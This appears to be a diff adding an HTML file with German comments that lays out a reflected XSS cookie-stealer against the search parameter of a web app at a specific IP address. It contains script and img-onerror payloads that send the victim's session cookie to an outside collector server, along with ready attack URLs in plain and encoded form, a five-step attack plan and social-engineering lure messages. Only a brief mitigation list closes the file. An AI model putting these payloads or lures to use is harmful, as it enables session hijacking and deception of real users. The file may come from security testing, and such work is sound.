@@ -1,0 +1,40 @@
+<!--
+XSS Cookie Stealer - Reflected XSS Payload (Search Parameter)
+Verwendung: Als URL-Parameter an eingeloggtes Opfer senden
+-->
+
+<!-- PAYLOAD FÜR URL-PARAMETER -->
+<script>location='http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie)</script>
+
+<!--
+Vollständige Angriffs-URL:
+http://41.87.56.125:5001/search?q=<script>location='http://141.87.56.31:8888/steal?c='%2BencodeURIComponent(document.cookie)</script>
+
+URL-Encoded Version:
+http://41.87.56.125:5001/search?q=%3Cscript%3Elocation%3D%27http%3A%2F%2F141.87.56.31%3A8888%2Fsteal%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%3C%2Fscript%3E
+
+Alternative - Image-based für Reflected XSS:
+-->
+<img src=x onerror="location='http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie)">
+
+<!--
+Vollständige URL (Image-based):
+http://41.87.56.125:5001/search?q=<img src=x onerror="location='http://141.87.56.31:8888/steal?c='%2BencodeURIComponent(document.cookie)">
+
+Angriffsszenario:
+1. Cookie-Stealer Server starten
+2. Präparierte URL erstellen (siehe oben)
+3. URL an eingeloggtes Opfer senden (z.B. via Social Engineering)
+4. Opfer klickt auf Link → Cookie wird gestohlen
+5. Angreifer kann Session übernehmen
+
+Social Engineering Beispiele:
+"Hey, schau dir diese Analyse an: http://41.87.56.125:5001/search?q=DAX"
+"Fehler gefunden, bitte testen: http://41.87.56.125:5001/search?q=<payload>"
+
+Mitigation:
+- Output Encoding für query Parameter: {{ query | e }}
+- Content Security Policy
+- X-XSS-Protection Header
+- Input Validation (Whitelist erlaubter Zeichen)
+-->
